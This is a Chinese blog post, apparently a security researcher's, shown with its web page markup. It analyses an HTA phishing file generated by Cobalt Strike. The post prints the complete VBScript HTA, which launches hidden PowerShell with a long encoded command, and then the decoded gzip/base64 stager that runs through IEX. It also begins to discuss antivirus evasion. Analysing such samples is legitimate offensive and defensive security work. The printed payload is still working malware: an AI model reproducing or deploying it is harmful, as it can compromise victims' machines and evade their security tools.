

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Glacier">
  <meta name="keywords" content="">
  
    <meta name="description" content="CS生成hta分析与powershell免杀看着自己刚开始入门写的wp，才发现自己从来没正儿八经写过啥博客，最近遇到了一群朋友及其博客，于是准备记录一点有质量的内容">
<meta property="og:type" content="article">
<meta property="og:title" content="CS生成hta分析与powershell免杀">
<meta property="og:url" content="https://glacierrrr.online/2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/index.html">
<meta property="og:site_name" content="Glacier&#39;s Blog">
<meta property="og:description" content="CS生成hta分析与powershell免杀看着自己刚开始入门写的wp，才发现自己从来没正儿八经写过啥博客，最近遇到了一群朋友及其博客，于是准备记录一点有质量的内容">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/4myYitWBsOSNvoJ.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/gSbkTOpM3fj1UCV.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/CyxmieSZpvrMLEc.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/yg2twhGMiqX6HuQ.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/EC8iXIbahkVWGSm.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/uT4nE71YSL5rpxf.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/WdOi26SaTtkljQG.png">
<meta property="og:image" content="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png">
<meta property="article:published_time" content="2022-08-16T01:35:22.000Z">
<meta property="article:modified_time" content="2022-11-15T12:10:23.888Z">
<meta property="article:author" content="Glacier">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png">
  
  
  
  <title>CS生成hta分析与powershell免杀 - Glacier&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"glacierrrr.online","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CS生成hta分析与powershell免杀"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-08-16 09:35" pubdate>
          2022年8月16日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          34k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          283 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CS生成hta分析与powershell免杀</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CS生成hta分析与powershell免杀"><a href="#CS生成hta分析与powershell免杀" class="headerlink" title="CS生成hta分析与powershell免杀"></a>CS生成hta分析与powershell免杀</h1><p>看着自己刚开始入门写的wp，才发现自己从来没正儿八经写过啥博客，最近遇到了一群朋友及其博客，于是准备记录一点有质量的内容</p>
<a id="more"></a>
<h2 id="hta文件分析"><a href="#hta文件分析" class="headerlink" title="hta文件分析"></a>hta文件分析</h2><p>hta文件是CS钓鱼经常会用到的一种攻击手法，但我从未考虑过里面的内容，今天突发奇想，想来看看里面到底写了些什么东西，并且杀毒软件是对于哪一部分进行了扫描并且报毒</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs VBScript">&lt;script language=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;<br>	<span class="hljs-keyword">Function</span> var_func()<br>		<span class="hljs-keyword">Dim</span> var_shell<br>		<span class="hljs-keyword">Set</span> var_shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>		var_shell.run <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWABhADIALwBpAFMAaABMADkASABIADYARgBQADAAUQBDAGEAdwBpAFgAWQBNAGgAagBWAHAASABHAGcAQQAwAEcANwBBAEQAbQB6AFUAVgBSAHUANwBzAHgASgBuADUAaAB0AHoASABtAHoAdgB6ADMATABSAHYASQB6AGUAdwBrAHUAeQBQAHQATABwAEoARgB1ADcAdQBxAHUAdQByAFUANgBlAHEAeQBUAHQAbQBOAHoAZwBJAEwATQA5AFUAagBsAEwAdQBaADAAQwBDADAAUABKAGUAcgA1AEgATABYAFQAVQA5AGgAMwBCAFAAMwBMAFoAOQBiAFIAeQA1AG0ANgBYAFEANgBlAEQARQBwAGUALwBFAEQARAA3ADgAZwBRAGcASQBhAGgAdAB4AGYAdQBhAHMAKwBDAHAARABEAEYAYQA3ADMASwBIAGgAeABQAEIATABaAHQATQBoAGwATAA2AGsAZwBKAFYARgBBACsAYQB1AHIAMwBGAFUAMgBGAGIAawBoAFcAdABNAFgARgB6AEYAcgBUADEAOABjAHkAagBZAGUAQwBXAEcAagB3AGwATAAwAC8AYQBiAG4ASQBNAHQAZABmAGYAMwBhAGkASQBLAEEAdQB1AHoAMABYAG0AcABSAEoAbwBZAGgAZABRAHoAYgBvAG0ARwBCADUANwA1AHoAMAB3ADAATgA2AE0AMgB6AHMAYQBXAFkAYwBYADkAeAAxAHkAKwBsAGwAdQAwAFoAeQBEADYATABKAFEAMgBFAE4AeABDAFEANgBKAEoAMAByAGUAZABoAGwARQBaAFEAMABuADMAYgBZAG8AWAA4AG4AMwAvAG0AKwBlAFgATgA3AGEAbwBrADcAUwBKAGsAaAA0AFcAOABuAG8AUwBNAE8AaQBWAGkAMgAzAG0AZQArADgARwBuAEcANAA0AFMAbgB4AGIAeQBxAG8AVQBEAEwALwBUAFcAcgBEAFMAMQBYAEsARgBTAEcAbQBmAGUAYQA1AG4AegA2AHMAbgAzAFAASAArAE8AegBQAFEAUgB4AFAARgA1AGsASwBuAFYAawAwADQAaABEADgATQArAFkAQwBPAGUATQBNAHcAWAB1AFcAVwA2ADMAMwBLADEANAByADYAOQBlAFQATwBNAFgARwBZADUAdABLAFMANABqAEEAYQBlAHIAOQBOAGcAYgAyAEUAYQBsAHQAcgBJAEoAVABZAGQAMABqAFcAbwA1AFUATgBJAG4AMgB2AG0AZQBYAEEAaQBvAEMAdwBLAFgATwA3AGkAQwArAGoAdAB2AFYAZABhAHUASABZAGoAMgB5ADYAQwAzAGUAWAB2ADIAbAAwAFYATgBCAHAAZgB3AFAAMQBkAHAAYwBKADcASgBaAEQAcQBzADQAQQB2AG4AagBuAHgATwAzAEMAbwBHAFcAOQBPADUAaQBDAGMAWAA3AHgALwBSAHkANABlAGYAcgA4AFEAagBNAC8AOQB5AEgAMQBBAFYAVQBKAHQAYQBpAEoARwBYAHgAagBnACsANAA2AHIAdQBhAHUAcgBaAFQAYQBrAEUARQArAGgANwA0AFYAVwBwAHYAZgBFAGwAWQB1AGMAQwBrADQAZwA1AGcAVgBKAG0AcwA1AFIARQBGAEYAKwA5AFgAZAArAFQAdAB0AGUATgBNAFAAaQBwADQAWgB1AEwAMQBwAG4AbgBWAE4ANgBUAG4ANAA4AGMAYwB1AEoAWgA1AEYAVgA3AG8AcgBQAG4AZABtAFQAegByADgAWQBrAFcAVQBUAEcAcQBUAHIAbgA1ACsARwBKAGwAMQBiAEwAbQAwAG0ATABuAEkAcwBmAEMARgA4ADQAYQBPAGMAMABiAFYATgBNAHoAeABLAEYAegBFAE4ALwBDAHoAawB6AHcAdQBVAE4ATQAvAG8ANQBGAE4AQQBsADcAKwBxAFMAWQA3AEYAMwBuAFQAcgBKACsAZABFAEQASABrAFAAdwBTAHUAZwBCAFAAKwB6AE0ANgBjAGMARgB2AEsASwBxADEASQBIADgARAB1ADkAQQAwADIAdgAxADMARABNADYARQBYADYAZgBMAFMAUwB5ACsANwBwAGUAOAByAGwAaABvADMAQwBzAE0AagAxAEkAegBqAG4AdQBNAGoAcABGAE4AbQBVAEYARABuAFIARABhADMAegBrAGgAZwB4AEwAeAB2AG0ALwAzAFoAWABqAFcAeABtAFkAUgBTAHkAaQA3AGsAVgAvAHcARwBrADUANgAwAGIAbgBnAHMAbgBKAHMASwBRAFgAWQBCAGgAcABQAHMAVQBXADgAaABPAFUAUwBsAHkAYgBZAHYAUQBlAHEASgBiADUAcwBXAEYALwBJAGUAWQBOAEoAQgB0AHcANQBFAEQAUwAzAHYASQBDAGMAeQBrAFcATwBnAHMANQBVAHgAQQBpAHYALwBLAEQANwA2AGsAVQA2AFkANAB2AGsAMABkAGsATQA2AHEAawBHAHcAagBFADIAcgBPACsAVQBSAGwAZABFAE0AbQBKAGYAbAAvADQALwBiAGwAbgBKAHcATwBSAFkAcgBWAEIAYQBSADMAVABnAE0AQgBkAE4AdABqAFIAVwA1AGkAQgBRAHoAcQBXAHIANwA0AEMALwBIACsATwAvAGQAKwBMAGoARQAvAHUAZABrAEkANgBEAG0AUgBoAGUAdwBnAEwAdQBzAEoAUwA0ADkATABKAG8AbgBUAHkAKwBYAHAARABjAHMATQB1AFkAQQBCAGEAbgBMAGcATwBYAFUAVQAwAHIAdQBxAG4AcABXAHgAUQBsADUANABpAEgAWgBLAG8AbQA0AEgAZAAwAEYATAAyAHMAdgB0AFgAVgBzAGEAdwBiAE8ASABSADkAagBKAFUAcQAvAFgARwBmAHIAMQBZAFEAOQBMADAAWABPAC8AWABlADYAcwBsAGMARgBEAHMAeAByAEYAawBSAEsATgA2AG0AVgBCAEwAbwBQAGMAYwBkAGUAUwAxAHMAcgArADIAWgB2AGYAUgBrADcAMQBsAHYAagBLAFgAbwBPADUAOABIADcAWABEAHAAdgBLAHYAaQBtADIASwB6AHQAUAB2AGoATwB0AHgANwBPAGQAawAvADcAQQBpAEcAKwBOAG0AUwBMAGYARwB5ADIANQAyAHAANgBFAGMAaQByAGYAVgB2AFoAMQBlAGQAZAA0ADkARwBEADgAaAA3AEoAdgBlAEIAMwBRAGUANwBqAHoAMwBYAHAATQBxAGwAVABxADMATgBGAFoARAA4AGMAQwBlADYARABJAFAAQwBUAGQAeQBSAGUAOQBmAE4AdQBhAEoARgBwAHYASQB2AG0AYQA3AHAASwBlAGMAVAB1AFEATwA5AHEAeABJAHIARgBEAG0AYgBTAEgAWgBTAEsARgBDAHoATABaAFMAVQBMAGYANgBQAG8AUQBwAHkASwBZACsAcAAzAGIAUwBYAFMAOQBuAHUAQgBYAE4AdABwAGEANgBoAGEAMwB0AFIANwBwADcAaAA1AHEANQBGAGgASgBaAEsAMABLAE8AQgB6ADAAUgBOADMATQA3ADgAZwBCAHoAKwBRAFkAegA3AFIAZQAwAHAANQByAEwAYgBDADcAaQA2AFoAbQB0AGEAMwBxAEEAdABqAFcAeQBTAEUAbQA0AC8AQwA1AE0AMgBKAHoAbwBZACsAYwBhAHAASwA0ADEAWQBhAHkAVgBRADQAOQA3AEwAUABKAHIASABNAFgAbwBLAFQAaAA5AHkAeABxADEATgBjAHMAMQBlADMAMABGAG0AYgBuAFUAVwBJAG4ALwAzAFIAOQBtAEIAQwB3AGIAYgBkAEgAegBTADcAWQBkAGgAdQBxAEMAcgBsAEEATgBaAG0ATwBRAGEAWQBiAFcAbQBEAHIASQBkAGcAcAA0AEcATgB5AHQAOABXAEMARgBxAHYARwBzAEsATwBOAEcAdQByAFUARQBEAHYASAB1AHEATgBaAFcARABCAG4AYQAwAEcAcgAwAGMATgA4ADEAaABDADAAeAA4AFoAbQBhAE0ANQBGAGIAegB3AHoAaQBZAE8AYwB1AG8AVQBIAHQAWgBoAFUATwBtAHgAUgA2AFIAdwBXAGMAYwAwAHkAWgBtAFIASABwAHYANgBCAHUATwBJAHoAcQBTAHgAaQBFAHQAZABzADUARAB3ADYAbwBrAG0AQwBSAGkAdgBzAEsASQBkAEYASwBMAHAAcQBTAHgARQBXAGcANgBFAHQAUABjADkAZgBoADYAMwBSAEIAQwAvAEUAUwBrADIAZABqAHYAMwArAHEASwB5AG8AYwBsAHcAZQBpAFQARQBUAFIAMQBKAHQATgBMAEIASgBkAHoAQgArAGIATABWAEUATABjAEkAdAAzAHgARQBQAG8AUwBZAGQAegBDAGEAQgBmAEEAegBMAGgALwBGAFkAMQBCAGkASgAxAFcAbAB6AHEATQB4AEYAZwBRAHoAMQBWADUATABhAHkAMgB5ADAAUgBGAFUAegBwAGcAdABCAHIATgBUADMAZQBLAEEATwBtADAATgBWAGsAegBmAHEAVwBCAG8ATwB1AGoAMwByAGQAUwBzADcAYwBRAFAASABpACsAMwBjADEAYQBxAHkAOABIAGkAawBzADMAQQBxAHgAKwB5ADQASABuAGoAagBlAFUAdgBzAHkAcwBDAGIAaABlAE8AYgBjADEAZAA2AHgAbQAxAGkARwBWAE4AaQA0AFMAbAArAG4AagB1ADMAQQBuAEkAbgBPAHoAeABiAHgARQAyAFgATwBMAGkATgBuAHgAZABUAGYANwA4AHcAbABUAGEASwBOADAARgBEAC8ALwAvAGoATgA2ADkAMABqAHIAUgBPAC8AcwBDAEMAZgBTADkAdgBjAEEAOABMADUAYQA3AGMAcQBwAHQAZwBuADkAWQByAGkAOQAyADgAMQBUAGsAMAAzAGIAbwBBAHYAcgBwAHoAVgAzAGEAYgBUAG8AZQBSAGkAbgArAEwAWABMAG0AQwB4AFoAcQB3AGcATABXAG0ATQA5AGsAWgBsAFgAbQBqAFgAZwBrAFYARgBBAE0AZQBsAHQAWQByADEAMQBDAGQAQQBFAC8AMQBxAGQAWgBUAGoAcwBEAG4AYwByAGgAVgBLAHUAcQBXAFMATwB4ACsASQB6AFIAYgB3AE0AUABZAEEAYgA0AEEAagA2AHcAdgBiAGkAZgBlAGgAYwBEAFQAUgBHADAAcQBpAFoAWgB5ADkAYwBCAFEAVQBNACsANABlAHIAdQAyAGQANAAyAEIAVgBlADAAYQAyADAAbQA0AHUASwArAHEAVQBWAGQAZwBSAHkAeAB0AFYAQgAxAHkATgBaAEEARwA1AFMASABrAFEAWgBPAEcAMABqAGkAdABEAC8AQQA4AHAAUgBWAHAANwBRAFgAUQBZAHgAegBTAGUALwBzAGYASABQAHoAZgAyAEkAeAA3AHEAegBsAFEAYQBhAEMASQBwAGYATgBmAHYAdgBEAHAAMwBmACsAMgBzAHIAdwArAHIAQwA2ADkAMgB0AHYANwBqAFgARQBBAGEAMABJAHQAcgBWAC8AWgB5AGgANgA5AHEAMQBxAGYATgBVAEEAcQBDAHMASQBOAHMAcQBHAGEAUQBSAE4AegB1AFkASgBrAEwANQBEAFAAcgBVAGoAZgBzADEASwBOAFEAdQBIAGoANwB2AG0AVgBCAGkANgAxAG8AYgBPAEUAMwB2AE4AUwB1AEUAWABiADkAbgBEAGEAUABIADMAUwB4AFUAQQByAGQAMgBxAHcAVgBuAEIAQgBqAFcARQBvAFYARAA0AGMAOABkAHkAYgBJAEgAUgBNAHAANQBpAE0AYQBMADMATwBHAG8AeAB6AGgASgBjACsANgB5AEwANAA5AGUAcwBDAHcAaQB1ACsAQQA3AEYASABYAFoATgB0AGkAbAB6ADUASQBKAFQATAA1AGYAUwAvAFcAdQBaAHoAdgB3ADkATAB3AC8ATwBUAHcAcAB1ADUAWQB0AHAAZwB2AGYAUABrAC8AVQA1ADIAdABoAE4ALwBSAGoAKwBJAFgASQBmACsARAB4AFAAdwAwADYAYgAvAEcAZABvAFUAdgBLAHgASABlADQATQB1AGMAKwBoAGoAdgBQAGgAYwAvAGwAcwB1AHAANgB5ADUAZAAvAE8AaABkAFkAUQB2AEUATAByAGoASABqAEwAdQBoAFUAQgAxAGQAcgBQADEARABQAGgAYwB5AGUANwBmAHcAagBYAGkATwBVAFcAYQBjAGQAZQBJACsAOABIAGQAUQBIAGgAaQBLAEYAVABnAG0AeQBVAHcAbwAvAFEAeQA1AGsANgBmAFkATgArADUARwBGAGsAbgB4AGUALwBjAGsARwBJAEsATABmAFIATgB4AHoATwBBAHAAUgBSADYAcQB0AFIAMABaAGkAUQBWAGgAcgBsAC8AQQB1ADcARABCAGoAUABUAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span><br>	<span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br>	var_func<br>	self.close<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure>
<p>首先来看hta的源码，使用VBS写的，是一种微软环境下的轻量级的解释型语言，同时它又是asp动态网页默认的编程语言，但这个不是重点，其中最令我们关注的是写入shell命令中的这一长短base64编码的东西，我们先解码看看是什么</p>
<p><img src="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png" srcset="/img/loading.gif" lazyload alt="base64解码"></p>
<p>解码完了之后是这一段，把<code>.</code>替换掉，得到这一段代码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IOMemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IOStreamReader(<span class="hljs-built_in">New-Object</span> IOCompressionGzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IOCompressionCompressionMode</span>]::Decompress)))ReadToEnd();<br></code></pre></td></tr></table></figure>

<p>我们还是先把中间的一长串拿去base64解密，但结果是一堆乱码，可惜<br>那我们来看看其他的<br>其中有这几个函数比较值得关注</p>
<blockquote>
<p><code>IOMemoryStream(,[Convert]::FromBase64String())</code>将字符串base64编码后，存入到流中<br><code>IOCompressionGzipStream()</code>使用Gzip压缩<br>最后通过Invoke-Expression（运行一个以字符串形式提供的 Windows PowerShell 表达式）将字符串当作命令执行</p>
</blockquote>
<p>网上有现成的脚本，我们直接拿去跑试一下<a target="_blank" rel="noopener" href="http://chernodv.blogspot.com.cy/2014/12/powershell-compression-decompression.html">脚本原文链接</a></p>
